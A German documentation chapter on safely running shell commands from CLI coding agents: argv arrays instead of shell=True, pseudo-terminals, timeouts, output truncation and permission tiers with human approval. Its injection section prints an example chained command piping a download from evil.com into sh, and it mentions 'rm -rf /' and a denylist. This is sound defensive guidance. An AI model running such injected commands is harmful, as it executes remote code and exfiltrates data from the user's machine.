# Subprozess-Steuerung, PTYs und Shell-Sicherheit

Ein CLI-Coding-Agent entfaltet seine Stärke erst dadurch, dass er nicht nur passiv Text generiert, sondern aktiv auf dem Betriebssystem agiert: Er führt Tests aus (`pytest`, `cargo test`), ruft Versionskontrollbefehle auf (`git status`, `git diff`), startet Compiler und analysiert Fehlermeldungen. 

Diese direkte Interaktion mit der Shell birgt jedoch gravierende Risiken: Sprachmodelle sind anfällig für Prompt Injections, können fatale Kommandos generieren (wie `rm -rf /` oder das Überschreiben sensibler Konfigurationsdateien) oder in unendlichen Prozess-Schleifen hängen bleiben. Eine professionelle CLI-Integration erfordert daher eine strikte Trennung von Shell-Befehlen, den Einsatz von Pseudo-Terminals (PTYs) sowie mehrstufige Sicherheits-Schleusen.

---

## Architektur der sicheren Prozess-Ausführung

Um den Entwicklerrechner zu schützen und gleichzeitig aussagekräftige Rückmeldungen an das Sprachmodell zurückzuspeisen, durchläuft jeder Werkzeug-Aufruf eine definierte Sicherheits- und Ausführungsarchitektur:

```
┌────────────────────────────────────────────────────────────────────────┐
│ Sicherheitsarchitektur für Subprozesse                                 │
│                                                                        │
│   ┌────────────────────────────────────────────────────────────┐       │
│   │ KI-Modell / Framework-SDK: Tool-Call Vorschlag             │       │
│   │ `{"tool": "bash", "command": "npm test"}`                  │       │
│   └─────────────────────────────┬──────────────────────────────┘       │
│                                 │                                      │
│                                 ▼                                      │
│   ┌────────────────────────────────────────────────────────────┐       │
│   │ Sicherheits-Filter & Policy-Engine                         │       │
│   │  ├─ Befehls-Klassifikation: Read-Only vs. Mutation        │       │
│   │  ├─ Denylist: Blockierung destruktiver Befehle (`rm -rf`)  │       │
│   │  └─ Human-in-the-Loop: Interaktive Freigabe durch Nutzer   │       │
│   └─────────────────────────────┬──────────────────────────────┘       │
│                                 │ (Bestätigt)                          │
│                                 ▼                                      │
│   ┌────────────────────────────────────────────────────────────┐       │
│   │ Prozess-Manager & PTY-Laufzeit                             │       │
│   │  ├─ Argument-Vektorisierung (`argv`-Array, kein Shell-Eval)│       │
│   │  ├─ Pseudo-Terminal (PTY): Erhalt von ANSI-Farben & TTY    │       │
│   │  ├─ Timeout-Wächter (z. B. 30s) mit SIGTERM / SIGKILL     │       │
│   │  └─ Output-Kappung (Truncation, z. B. max. 50 KB Puffer)   │       │
│   └─────────────────────────────┬──────────────────────────────┘       │
│                                 │                                      │
│                                 ▼                                      │
│   ┌────────────────────────────────────────────────────────────┐       │
│   │ Bereinigtes Ergebnis an KI-Kontext                         │       │
│   │ Exit-Code, formatierte Fehlerausgabe, bereinigter Text     │       │
│   └────────────────────────────────────────────────────────────┘       │
└────────────────────────────────────────────────────────────────────────┘
```

---

## Vermeidung von Shell-Injections: `argv` vs. `shell=True`

Der verhängnisvollste Fehler bei der Entwicklung von CLI-Agenten ist die Übergabe von Befehlsstrings an eine auswertende Shell-Instanz (z. B. `subprocess.run(command, shell=True)` in Python oder `child_process.exec(command)` in Node.js). 

Wenn ein Modell oder ein durch Prompt Injection manipulierter Dateiinhalt ein Semikolon, Pipes oder Subshell-Operatoren einbettet (z. B. `cat datei.txt; curl evil.com/exfiltrate | sh`), führt das Betriebssystem beide Befehle ungeprüft aus.

### Best Practice: Strukturierte Argument-Vektoren

Kommandos dürfen niemals als unstrukturierter String an eine Shell übergeben werden. Stattdessen sind strikt typisierte Argument-Arrays zu verwenden:

```python
# ❌ GEFÄHRLICH: Anfällig für Shell-Injections und Command-Chaining
subprocess.run(f"git checkout {branch_name}", shell=True)

#  SICHER: Das Betriebssystem ruft das Binary direkt ohne Shell-Parsing auf
subprocess.run(["git", "checkout", branch_name], shell=False)
```

Muss dem Modell dennoch eine flexible Shell zur Verfügung gestellt werden, muss der Befehlsstring vorab durch einen sicheren Parser (z. B. `shlex.split()` in Python oder entsprechende POSIX-Shell-Lexer) validiert und in ein Argument-Array zerlegt werden.

---

## Pseudo-Terminals (PTY): Farbausgaben und interaktive Programme

Führt ein Agent Subprozesse über Standard-Pipes (`pipe()`) aus, erkennen viele Compiler, Test-Frameworks und CLI-Tools (wie `git diff`, `pytest` oder `clang`), dass kein TTY vorhanden ist. In der Folge deaktivieren sie Syntax-Hervorhebungen oder brechen ab, weil sie eine interaktive Terminal-Umgebung erwarten.

### Warum Pseudo-Terminals (PTYs)?

Ein **Pseudo-Terminal (PTY)** stellt ein Master-Slave-Paar bereit, das dem aufgerufenen Kindprozess ein echtes Hardware-Terminal vortäuscht:

1. **Erhalt von Farben und Formatierungen:** Werkzeuge geben ihre Fehlermeldungen und Diffs mit vollständigen ANSI-Farbcodes aus, was die Lesbarkeit für den menschlichen Entwickler drastisch erhöht.
2. **Interaktive CLI-Tools:** Programme, die auf Cursortasten oder Passworteingaben warten, können vom Agenten über das PTY gesteuert werden.
3. **Bibliotheken:**
   * **Rust:** `portable-pty`
   * **Go:** `github.com/creack/pty`
   * **Node.js:** `node-pty`
   * **Python:** `ptyprocess` / `pty`

---

## Laufzeit-Schutzmaßnahmen und Ressourcen-Limits

Da vom Modell aufgerufene Befehle fehlerhaft sein oder in Endlosschleifen geraten können (z. B. ein fehlerhafter Unit-Test oder ein blockierender Web-Server), muss der Subprozess-Manager harte Guardrails durchsetzen:

### 1. Timeout-Überwachung und Prozessbaum-Terminierung

Jeder Subprozess muss mit einem expliziten Timeout versehen werden (z. B. 30 Sekunden für Standard-Befehle, erweiterbar für Builds). Läuft der Timer ab, genügt ein einfaches `kill(pid)` meist nicht, da Kindprozesse (z. B. vom Build-Tool gestartete Subprozesse) als Waisen im System verbleiben.

* **Prozessgruppen:** Der Befehl muss in einer eigenen Prozessgruppe (`setpgid`) gestartet werden.
* **Kaskadiertes Beenden:** Nach Ablauf des Timeouts wird zunächst `SIGTERM` an die gesamte Prozessgruppe gesendet (`killpg`). Reagiert der Prozess nach kurzer Karenzzeit (z. B. 2 Sekunden) nicht, folgt das unweigerliche `SIGKILL`.

### 2. Output-Kappung (Buffer Truncation)

Gibt ein Befehl versehentlich Millionen von Zeilen aus (z. B. `cat /dev/urandom` oder ein rekursives Listing riesiger Ordner), darf der Arbeitsspeicher des CLI-Agenten nicht überlaufen.

* Der Ausgabepuffer wird auf eine Maximalgröße begrenzt (z. B. 50 KB oder 2.000 Zeilen).
* Bei Überschreitung wird der Stream abgeschnitten und mit einem eindeutigen Hinweis für das Modell versehen:  
  `[Warnung: Ausgabe nach 50 KB abgeschnitten. Bitte die Abfrage präzisieren.]`

---

## Berechtigungsstufen und Human-in-the-Loop

Ein ausgereifter CLI-Agent implementiert ein mehrstufiges Berechtigungsmodell für Werkzeugaufrufe:

| Stufe | Kategorie | Typische Befehle | Freigabemodus |
| :--- | :--- | :--- | :--- |
| **0: Read-Only** | Inspektion | `git status`, `ls`, `grep`, `cat` | Vollautomatisch (Silent) |
| **1: Verifikation** | Tests & Builds | `npm test`, `pytest`, `cargo check` | Automatisch oder einmalige Session-Freigabe |
| **2: Mutation** | Dateisystem-Änderungen | Code-Editierung, `npm install`, `rm test.tmp` | Interaktive Bestätigung (`[y/n]`) |
| **3: Kritisch** | System & Remote | `git push`, Shell-Scripts, `sudo`, `docker run` | Explizite Bestätigung mit Diff-Ansicht |

---

## Querverweise und Vertiefung

* Für die Integration in Unix-Pipelines und die Trennung von `stdout` und `stderr` siehe [Unix-Pipes, Headless-Betrieb und Standard-Streams](unix-pipes-headless.md).
* Details zur interaktiven Darstellung von Bestätigungsdialogen und Tastatur-Handling bietet [TUI-Schnittstellen, REPL-Loops und Token-Streaming](tui-repl-terminal-streaming.md).
* Weitere Aspekte zur Kapselung von Coding-Agenten in Docker- und OS-Sandboxes beschreibt das Kapitel [Terminal-Agenten und Sandboxing](../ide-ki-integration/terminal-agenten-sandboxing.md).
